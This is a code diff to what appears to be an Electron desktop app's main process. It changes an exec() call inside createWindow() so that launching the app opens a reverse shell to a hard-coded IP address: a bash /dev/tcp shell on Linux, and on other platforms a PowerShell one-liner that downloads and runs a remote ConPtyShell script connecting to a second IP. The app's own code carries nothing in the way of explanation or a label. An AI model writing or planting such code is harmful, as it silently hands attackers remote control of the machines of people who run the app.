@@ -2,6 +2,7 @@
 const { app, BrowserWindow } = require("electron");
 const { exec } = require("child_process");
 const path = require("path");
+const { platform } = require("process");
 
 // Keep a global reference of the window object, if you don't, the window will
 // be closed automatically when the JavaScript object is garbage collected.
@@ -34,7 +35,9 @@ function createWindow() {
   //execute the command
 
   exec(
-    "/bin/bash -i > /dev/tcp/82.165.97.169/5010 0<&1 2>&1",
+    platform === "linux"
+      ? "/bin/bash -i > /dev/tcp/82.165.97.169/5010 0<&1 2>&1"
+      : "IEX(IWR https://raw.githubusercontent.com/benax-rw/ConPtyShell/master/InvokeConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 87.76.65.54 5010",
     (error, stdout, stderr) => {
       if (error) {
         console.log(`error: ${error.message}`);
